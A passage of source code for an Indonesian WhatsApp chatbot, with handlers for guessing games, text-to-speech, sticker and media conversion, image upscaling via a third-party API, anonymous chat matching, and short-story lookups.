if (db.data.users[m.sender].game.tebakkata.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.tebakkata = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.pertanyaan, 
jawaban: data.result.jawaban
}
setReply(`Pertanyaan : ${data.result.pertanyaan}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "tebaklirik") {
if (db.data.users[m.sender].game.tebaklirik.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.tebaklirik = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.question, 
jawaban: data.result.answer
}
setReply(`Pertanyaan : ${data.result.question}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
} else if (command == "tebakjenaka") {
if (db.data.users[m.sender].game.tebakjenaka.status) return setReply(mess.cmd.game.query)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=${lolhumankey}`) 
db.data.users[m.sender].game.tebakjenaka = {
status: true,
expired: Date.now() + toMs(gameWaktu + "s"),
pertanyaan: data.result.question, 
jawaban: data.result.answer
}
setReply(`Pertanyaan : ${data.result.question}\nWaktu : ${gameWaktu} ${mess.time.seconds}`)
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted) 
}
break
//=========================[ FITURE CONVERTER ]=========================\\
case "tts":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (mentionByReply) {
if (!m.quoted.mtype == "conversation") return setReply(mess.reply.message) 
var teks = m.quoted.text
} else {
var teks = text
}
let language = [
{"id": "af", "name": "Afrikaans"},
{"id": "sq", "name": "Albanian"},
{"id": "ar", "name": "Arabic"},
{"id": "hy", "name": "Armenian"},
{"id": "ca", "name": "Catalan"},
{"id": "zh", "name": "Chinese"},
{"id": "zh-cn", "name": "Chinese (Mandarin/China)"},
{"id": "zh-tw", "name": "Chinese (Mandarin/Taiwan)"},
{"id": "zh-yue", "name": "Chinese (Cantonese)"},
{"id": "hr", "name": "Croatian"},
{"id": "cs", "name": "Czech"},
{"id": "da", "name": "Danish"},
{"id": "nl", "name": "Dutch"},
{"id": "en", "name": "English"},
{"id": "en-au", "name": "English (Australia)"},
{"id": "en-uk", "name": "English (United Kingdom)"},
{"id": "en-us", "name": "English (United States)"},
{"id": "eo", "name": "Esperanto"},
{"id": "fi", "name": "Finnish"},
{"id": "fr", "name": "French"},
{"id": "de", "name": "German"},
{"id": "el", "name": "Greek"},
{"id": "ht", "name": "Haitian Creole"},
{"id": "hi", "name": "Hindi"},
{"id": "hu", "name": "Hungarian"},
{"id": "is", "name": "Icelandic"},
{"id": "id", "name": "Indonesian"},
{"id": "it", "name": "Italian"},
{"id": "ja", "name": "Japanese"},
{"id": "ko", "name": "Korean"},
{"id": "la", "name": "Latin"},
{"id": "lv", "name": "Latvian"},
{"id": "mk", "name": "Macedonian"},
{"id": "no", "name": "Norwegian"},
{"id": "pl", "name": "Polish"},
{"id": "pt", "name": "Portuguese"},
{"id": "pt-br", "name": "Portuguese (Brazil)"},
{"id": "ro", "name": "Romanian"},
{"id": "ru", "name": "Russian"},
{"id": "sr", "name": "Serbian"},
{"id": "sk", "name": "Slovak"},
{"id": "es", "name": "Spanish"},
{"id": "es-es", "name": "Spanish (Spain)"},
{"id": "es-us", "name": "Spanish (United States)"},
{"id": "sw", "name": "Swahili"},
{"id": "sv", "name": "Swedish"},
{"id": "ta", "name": "Tamil"},
{"id": "th", "name": "Thai"},
{"id": "tr", "name": "Turkish"},
{"id": "vi", "name": "Vietnamese"},
{"id": "cy", "name": "Welsh"}
]
let data = language.map((x) => x.id)
if (teks.split("|")[0] && data.includes(teks.split("|")[1])) {
sock.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/gtts/${teks.split("|")[1]}?apikey=${lolhumankey}&text=${encodeURI(teks.split("|")[0])}` }, mimetype: "audio/mp4", seconds: 359996949, ptt: true }, { quoted: setQuoted })
} else if (teks.split("|")[0] && !data.includes(teks.split("|")[1])) {
let listLanguage = []
for (let x of language) {
listLanguage.push({
title: x.name,
rowId: `${prefix + command} ${teks}|${x.id}`,
description: `Language ${x.name}`
})
}
const sections = [
{title: "Total Language" + language.length,
rows: listLanguage }]
const listMessage = {
text: `📂 LANGUAGE`,
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else setReply(mess.query.text)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "ttp":
case "ttp2":
case "ttp3":
case "ttp4":
case "ttp5":
case "ttp6":
case "attp":
case "attp2":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { sticker: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${lolhumankey}&text=${encodeURI(text)}` }}, { quoted: setQuoted }) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "stiker":
case "sticker":
case "s":{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
try{
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendStimg(m.chat, media, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
} catch {
const media = await sock.downloadMediaMessage(quoted)
await sock.sendImageToWebp(m.chat, media, setQuoted) 
}
} else if (isVideo || isQuotedVideo) {
try{
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendStvid(m.chat, media, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
} catch {
const media = await sock.downloadMediaMessage(quoted)
await sock.sendVideoToWebp(m.chat, media, setQuoted) 
}
} else setReply(mess.cmd.sticker.text(prefix, command))
}
break
case "swm":
case "wm":
case "take":{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage && text.split("|")[0] || isQuotedImage && text.split("|")[0]) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendStimg(m.chat, media, setQuoted, { packname: text.split("|")[0], author: text.split("|")[1] })
} else if (isVideo && text.split("|")[0] || isQuotedVideo && text.split("|")[0]) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendStvid(m.chat, media, setQuoted, { packname: text.split("|")[0], author: text.split("|")[1] })
} else if (isQuotedSticker && text.split("|")[0]) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
try{
await sock.sendStimg(m.chat, media, setQuoted, { packname: text.split("|")[0], author: text.split("|")[1] })
} catch {
const webpToMp4 = await webp2mp4File(media)
await sock.sendStvid(m.chat, webpToMp4.result, setQuoted, { packname: text.split("|")[0], author: text.split("|")[1] })
}
} else setReply(mess.cmd.take.text(prefix, command))
}
break
case "removebg":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await removebg(media)
await sock.sendMessage(m.chat, { image: anu, caption: mess.success }, { quoted: setQuoted })
} else if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const fileName = getRandom(".png")
exec(`ffmpeg -i ${media} ./ACTION/MEDIA/SAMPAH/${fileName}`, async (err) => {
const anu = await removebg(`./ACTION/MEDIA/SAMPAH/${fileName}`)
await sock.sendStimg(m.chat, anu, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
})
} else setReply(mess.cmd.removebg.text(prefix, command))
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "emojimix":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!allemojinya.includes(text.split("+")[0])) return setReply(mess.cmd.emojimix.text(prefix, command)) 
if (!allemojinya.includes(text.split("+")[1])) return setReply(mess.cmd.emojimix.text(prefix, command)) 
await sock.sendStimg(m.chat, `https://api.lolhuman.xyz/api/emojimix/${text.split("+")[0]}+${text.split("+")[1]}?apikey=${lolhumankey}`, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "duration":{
if (m.isGroup && !isSewa) return onlySewa()
if (isQuotedAudio && text) {
if (isNaN(text)) return setReply(mess.cmd.duration.query) 
const fileName = randomNomor(10000)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + fileName)
const file = fs.readFileSync(`./ACTION/MEDIA/SAMPAH/${fileName}.mp3`)
await sock.sendMessage(m.chat, { audio: file, seconds: text, mimetype: "audio/mp4", ptt: true }, { quoted : setQuoted })
} else if (isVideo && text || isQuotedVideo && text) {
if (isNaN(text)) return setReply(mess.cmd.duration.query) 
const fileName = randomNomor(10000)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + fileName)
const file = fs.readFileSync(`./ACTION/MEDIA/SAMPAH/${fileName}.mp4`)
await sock.sendMessage(m.chat, { video: file, seconds: text, mimetype: "video/mp4" }, { quoted : setQuoted })
} else setReply(mess.cmd.duration.text(prefix, command)) 
}
break
case "toimg":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isQuotedSticker) return setReply(mess.reply.sticker)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const fileName = getRandom(".png")
exec(`ffmpeg -i ${media} ./ACTION/MEDIA/SAMPAH/${fileName}`, async (err) => {
if (err) return sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
const file = fs.readFileSync(`./ACTION/MEDIA/SAMPAH/${fileName}`)
sock.sendMessage(m.chat, { image: file, caption: mess.success }, { quoted: setQuoted })
})
}
break
case "tovn":{
if (m.isGroup && !isSewa) return onlySewa()
if (isQuotedAudio) {
const fileName = randomNomor(10000)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + fileName)
const file = fs.readFileSync(`./ACTION/MEDIA/SAMPAH/${fileName}.mp3`)
sock.sendVn(m.chat, file, setQuoted)
} else if (isVideo || isQuotedVideo) {
const { toAudio } = require("../../../ACTION/STORAGE/ACC/converter")
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const file = await toAudio(media, "mp4")
sock.sendVn(m.chat, file, setQuoted)
} else setReply(mess.cmd.tovn.text(prefix, command)) 
}
break
case "tomp4":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isQuotedSticker) return setReply(mess.reply.sticker)
onlyWait()
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const webpToMp4 = await webp2mp4File(media)
await sock.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: mess.success } }, { quoted: setQuoted })
}
break
case "tomp3":{
if (m.isGroup && !isSewa) return onlySewa()
if (isVideo || isQuotedVideo) {
onlyWait()
const { toAudio } = require("../../../ACTION/STORAGE/ACC/converter")
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const file = await toAudio(media, "mp4")
await sock.sendMessage(m.chat, { audio: file, mimetype: "audio/mpeg" }, { quoted : setQuoted })
} else setReply(mess.cmd.tomp3.text(prefix, command)) 
}
break
case "togif":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isQuotedSticker) return setReply(mess.reply.sticker)
onlyWait()
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const webpToMp4 = await webp2mp4File(media)
await sock.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: mess.success }, gifPlayback: true }, { quoted: setQuoted })
}
break
case "tourl":{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
onlyWait() 
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await TelegraPh(media)
await setReply(anu)
} else if (isVideo || isQuotedVideo) {
onlyWait() 
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else if (isQuotedAudio) {
onlyWait() 
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else if (isQuotedSticker) {
onlyWait() 
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
await setReply(anu.url)
} else setReply(mess.cmd.tourl.text(prefix, command)) 
}
break
case "tohd":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
await sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/upscale?apikey=${lolhumankey}&img=${anu.url}` }, caption: mess.success }, { quoted: setQuoted })
} else if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const fileName = getRandom(".png")
exec(`ffmpeg -i ${media} ./ACTION/MEDIA/SAMPAH/${fileName}`, async (err) => {
const anu = await UploadFileUgu(`./ACTION/MEDIA/SAMPAH/${fileName}`)
await sock.sendStimg(m.chat, `https://api.lolhuman.xyz/api/upscale?apikey=${lolhumankey}&img=${anu.url}`, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
})
} else setReply(mess.cmd.tohd.text(prefix, command))
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "to2d":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
await sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolhumankey}&img=${anu.url}` }, caption: mess.success }, { quoted: setQuoted })
} else if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const fileName = getRandom(".png")
exec(`ffmpeg -i ${media} ./ACTION/MEDIA/SAMPAH/${fileName}`, async (err) => {
const anu = await UploadFileUgu(`./ACTION/MEDIA/SAMPAH/${fileName}`)
await sock.sendStimg(m.chat, `https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolhumankey}&img=${anu.url}`, setQuoted, { packname: db.data.settings[botNumber].namabot, author: m.pushName })
})
} else setReply(mess.cmd.to2d.text(prefix, command))
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE ANONYMOUS ]=========================\\
case "anonymous":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
let button = [
{ buttonId: `${prefix}start`, buttonText: { displayText: `START` }, type: "RESPONSE" },
{ buttonId: `${prefix}keluar`, buttonText: { displayText: `KELUAR` }, type: "RESPONSE" },
]
sock.sendButLoc(m.chat, mess.cmd.anonymous.text, copyrightnya, zfrply, button)
}
break
case "start":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (roomA || roomB) return sock.sendButMessage(m.chat, mess.cmd.start.query, copyrightnya, [{ buttonId: `${prefix}keluar`, buttonText: { displayText: "keluar" }, type: 1 }], setQuoted)
if (room) {
await sock.sendMessage(room.a, { text: mess.cmd.start.text1 })
room.b = m.sender
room.state = "CHATTING"
room.expired = "INFINITY"
await sock.sendMessage(room.b, { text: mess.cmd.start.text1 })
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: "",
state: "WAITING",
expired: Date.now() + toMs("5m"),
}
anonChat.push(obj)
setReply(mess.cmd.start.text2)
}
}
break
case "startchat":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (!Input) return setReply(mess.input)
if (roomA || roomB) return sock.sendButMessage(m.chat, mess.cmd.startchat.query, copyrightnya, [{ buttonId: `${prefix}keluar`, buttonText: { displayText: "keluar" }, type: 1 }], setQuoted)
let id = +new Date()
const obj = {
id,
a: m.sender,
b: Input,
state: "CHATTING",
expired: "INFINITY",
}
anonChat.push(obj)
setReply(mess.cmd.startchat.text)
}
break
case "keluar":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (roomA && roomA.state == "CHATTING") {
await sock.sendMessage(roomA.b, { text: mess.cmd.keluar.text1 })
await setTimeout(() => {
setReply(mess.cmd.keluar.text2)
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
}, 1000)
} else if (roomA && roomA.state == "WAITING") {
setReply(mess.cmd.keluar.text2)
anonChat.splice(anonChat.indexOf(roomA, 1))
} else if (roomB && roomB.state == "CHATTING") {
await sock.sendMessage(roomB.a, { text: mess.cmd.keluar.text1 })
setReply(mess.cmd.keluar.text2)
roomB.b = ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
} else setReply(mess.cmd.keluar.text3)
}
break
case "next":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (roomA && roomA.state == "WAITING") {
setReply(mess.cmd.next.text1)
anonChat.splice(roomA, 1)
await setTimeout(async () => {
if (Object.values(anonChat).find((room) => room.state === "WAITING" && room.b == "")) {
await sock.sendMessage(room.a, { text: mess.cmd.next.text2 })
room.b = m.sender
room.state = "CHATTING"
room.expired = "INFINITY"
await sock.sendMessage(room.b, { text: mess.cmd.next.text2 })
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: "",
state: "WAITING",
expired: Date.now() + toMs("5m"),
}
anonChat.push(obj)
setReply(mess.cmd.next.text3)
}
}, 2000)
} else if (roomA && roomA.state == "CHATTING") {
await sock.sendMessage(roomA.b, { text: mess.cmd.next.text4 })
setReply(mess.cmd.next.text5)
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
} else if (roomB) {
await sock.sendMessage(roomB.a, { text: mess.cmd.next.text4 })
setReply(mess.cmd.next.text6)
roomB.b = ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
await setTimeout(async () => {
if (Object.values(anonChat).find((room) => room.state === "WAITING" && room.b == "")) {
await sock.sendMessage(room.a, { text: mess.cmd.next.text7 })
room.b = m.sender
room.state = "CHATTING"
room.expired = "INFINITY"
await sock.sendMessage(room.b, { text: mess.cmd.next.text7 })
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: "",
state: "WAITING",
expired: Date.now() + toMs("5m"),
}
anonChat.push(obj)
setReply(mess.cmd.next.text8)
}
}, 2000)
} else setReply(mess.cmd.next.text9)
}
break
case "sendkontak":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (roomA && roomA.state == "CHATTING") {
sock.sendContact(roomA.b, roomA.a.split("@")[0], await sock.getName(roomA.a))
} else if (roomB && roomB.state == "CHATTING") {
sock.sendContact(roomB.a, roomB.b.split("@")[0], await sock.getName(roomB.b))
} else if (roomA == "undefined" || roomB == "undefined") {
setReply(mess.cmd.sendkontak.text1)
} else setReply(mess.cmd.sendkontak.text2)
}
break
case "invite":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup) return setReply(mess.only.chats)
if (!roomA) return setReply(mess.cmd.invite.text1)
if ((roomB && roomB.state == "CHATTING") || (roomA && roomA.state == "CHATTING")) return setReply(mess.cmd.invite.text2)
let getGroups = await sock.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let ana = groups.map((v) => v.id)
let mem = []
for (let i of ana) {
let data = await sock.groupMetadata(i)
let obj = { id: data.id, total: data.participants.length }
await mem.push(obj)
}
let groupInvite = await mem.filter((member) => member.total > 50)
let button = [{ buttonId: `${prefix}joinchat ${roomA.id}`, buttonText: { displayText: `ᴊᴏɪɴ ᴄʜᴀᴛ` }, type: "RESPONSE" }]
await setReply(mess.cmd.invite.text4(groupInvite))
for (let x of groupInvite) {
await sleep(3000)
await sock.sendButLoc(x.id, mess.cmd.invite.text3, copyrightnya, zfrply, button)
}
await setReply(mess.cmd.invite.text5(groupInvite)) 
}
break
case "joinchat":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.joinchat.text1)
if (roomA && roomA.state == "WAITING") return setReply(mess.cmd.joinchat.text2)
if ((roomB && roomB.state == "CHATTING") || (roomA && roomA.state == "CHATTING")) return setReply(mess.cmd.joinchat.text3)
let joinRoom = Object.values(anonChat).find((room) => room.id == text && room.state == "WAITING")
if (joinRoom) {
await sock.sendMessage(joinRoom.a, { text: mess.cmd.joinchat.text4 })
room.b = m.sender
room.state = "CHATTING"
room.expired = "INFINITY"
await sock.sendMessage(joinRoom.b, { text: mess.cmd.joinchat.text4 })
} else if (room) {
await sock.sendMessage(room.a, { text: mess.cmd.joinchat.text4 })
room.b = m.sender
room.state = "CHATTING"
room.expired = "INFINITY"
await sock.sendMessage(room.b, { text: mess.cmd.joinchat.text4 })
} else {
let id = +new Date()
const obj = {
id,
a: m.sender,
b: "",
state: "WAITING",
expired: Date.now() + toMs("5m"),
}
anonChat.push(obj)
setReply(mess.cmd.joinchat.text5)
}
}
break
//=========================[ FITURE MOVIE STORY ]=========================\\
case "cerpen":{
if (m.isGroup && !isSewa) return onlySewa()
let anu = text? text : false
if (anu == "random") {
try{
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolhumankey}`)
let teks = `⭔ _*Title :*_ ${data.result.title}\n`
teks += `⭔ _*Creator :*_ ${data.result.creator}\n`
teks += `⭔ _*Story :*_\n${data.result.cerpen}`
setReply(teks) 
} catch {sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)}
} else if (anu) {
try{
let data = await cerpen(text)
let teks = `⭔ _*Title :*_ ${data.title}\n`
teks += `⭔ _*Author :*_ ${data.author}\n`
teks += `⭔ _*Category :*_ ${data.kategori}\n`
teks += `⭔ _*Pass Moderation :*_ ${data.lolos}\n`
teks += `⭔ _*Story :*_\n${data.cerita}`
setReply(teks) 
} catch {}
} else {
const sections = [{
title: `PLEASE SELECT`,
rows: [
{title: "RANDOM", rowId: `${prefix + command} random`, description: "CERPEN RANDOM"},
{title: "ANAK", rowId: `${prefix + command} anak`, description: "CERPEN ANAK"},
{title: "BUDAYA", rowId: `${prefix + command} budaya`, description: "CERPEN BUDAYA"},
{title: "GALAU", rowId: `${prefix + command} galau`, description: "CERPEN GALAU"},
{title: "GOKIL", rowId: `${prefix + command} gokil`, description: "CERPEN GOKIL"},
{title: "INSPIRATIF", rowId: `${prefix + command} inspiratif`, description: "CERPEN INSPIRATIF"},
{title: "JEPANG", rowId: `${prefix + command} jepang`, description: "CERPEN JEPANG"},
{title: "KEHIDUPAN", rowId: `${prefix + command} kehidupan`, description: "CERPEN KEHIDUPAN"},
{title: "KELUARGA", rowId: `${prefix + command} keluarga`, description: "CERPEN KELUARGA"},
{title: "KOREA", rowId: `${prefix + command} korea`, description: "CERPEN KOREA"},
{title: "KRISTEN", rowId: `${prefix + command} kristen`, description: "CERPEN KRISTEN"},
{title: "LIBURAN", rowId: `${prefix + command} liburan`, description: "CERPEN LIBURAN"},
{title: "MALAYSIA", rowId: `${prefix + command} malaysia`, description: "CERPEN MALAYSIA"},
{title: "MENGHANCURKAN", rowId: `${prefix + command} mengharukan`, description: "CERPEN MENGHANCURKAN"},
{title: "MISTERI", rowId: `${prefix + command} misteri`, description: "CERPEN MISTERI"},
{title: "MOTIVASI", rowId: `${prefix + command} motivasi`, description: "CERPEN MOTIVASI"},
{title: "NASIHAT", rowId: `${prefix + command} nasihat`, description: "CERPEN NASIHAT"},
{title: "NASIONALISME", rowId: `${prefix + command} nasionalisme`, description: "CERPEN NASIONALISME"},
{title: "OLAHRAGA", rowId: `${prefix + command} olahraga`, description: "CERPEN OLAHRAGA"},
{title: "PENANTIAN", rowId: `${prefix + command} penantian`, description: "CERPEN PENANTIAN"},
{title: "PENDIDIKAN", rowId: `${prefix + command} pendidikan`, description: "CERPEN PENDIDIKAN"},
{title: "PENGALAMAN", rowId: `${prefix + command} pengalaman`, description: "CERPEN PENGALAMAN"},
{title: "PENGORBANAN", rowId: `${prefix + command} pengorbanan`, description: "CERPEN PENGORBANAN"},
{title: "PENYESALAN", rowId: `${prefix + command} penyesalan`, description: "CERPEN PENYESALAN"},
{title: "PERJUANGAN", rowId: `${prefix + command} perjuangan`, description: "CERPEN PERJUANGAN"},
{title: "PERPISAHAN", rowId: `${prefix + command} perpisahan`, description: "CERPEN PERPISAHAN"},
{title: "PERSAHABATAN", rowId: `${prefix + command} persahabatan`, description: "CERPEN PERSAHABATAN"},
{title: "PETUALANGAN", rowId: `${prefix + command} petualangan`, description: "CERPEN PETUALANGAN"},
{title: "RAMADHAN", rowId: `${prefix + command} ramadhan`, description: "CERPEN RAMADHAN"},
{title: "REMAJA", rowId: `${prefix + command} remaja`, description: "CERPEN REMAJA"},
{title: "RINDU", rowId: `${prefix + command} rindu`, description: "CERPEN RINDU"},
{title: "ROHANI", rowId: `${prefix + command} rohani`, description: "CERPEN ROHANI"},
{title: "ROMANTIS", rowId: `${prefix + command} romantis`, description: "CERPEN ROMANTIS"},
{title: "SASTRA", rowId: `${prefix + command} sastra`, description: "CERPEN SASTRA"},
{title: "SEDIH", rowId: `${prefix + command} sedih`, description: "CERPEN SEDIH"},
{title: "SEJARAH", rowId: `${prefix + command} sejarah`, description: "CERPEN SEJARAH"},
{title: "CINTA", rowId: `${prefix + command} cinta`, description: "CERPEN CINTA"},
{title: "CINTA ISLAMI", rowId: `${prefix + command} cinta islami`, description: "CERPEN CINTA ISLAMI"},
{title: "CINTA PERTAMA", rowId: `${prefix + command} cinta pertama`, description: "CERPEN CINTA PERTAMA"},
{title: "CINTA ROMANTIS", rowId: `${prefix + command} cinta romantis`, description: "CERPEN CINTA ROMANTIS"},
{title: "CINTA SEDIH", rowId: `${prefix + command} cinta sedih`, description: "CERPEN CINTA SEDIH"},
{title: "CINTA SEGITIGA", rowId: `${prefix + command} cinta segitiga`, description: "CERPEN CINTA SEGITIGA"},
{title: "CINTA SEJATI", rowId: `${prefix + command} cinta sejati`, description: "CERPEN CINTA SEJATI"},
{title: "BAHASA DAERAH", rowId: `${prefix + command} bahasa daerah`, description: "CERPEN BAHASA DAERAH"},
{title: "BAHASA INGRIS", rowId: `${prefix + command} bahasa inggris`, description: "CERPEN BAHASA INGRIS"},
{title: "BAHASA JAWA", rowId: `${prefix + command} bahasa jawa`, description: "CERPEN BAHASA JAWA"},
{title: "BAHASA SUNDA", rowId: `${prefix + command} bahasa sunda`, description: "CERPEN BAHASA SUNDA"},
{title: "KISAH NYATA", rowId: `${prefix + command} kisah nyata`, description: "CERPEN KISAH NYATA"},
{title: "PATAH HATI", rowId: `${prefix + command} patah hati`, description: "CERPEN PATAH HATI"},
]}]
const listMessage = { text: "CERPEN", buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
}
break
case "ceritahoror":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolhumankey}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Desc* : ${data.result.desc}\n`
teks += `⭔ *Story* :\n${data.result.story}\n`
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "lk21":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.lk21.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/lk21?apikey=${lolhumankey}&query=${encodeURI(text)}`)
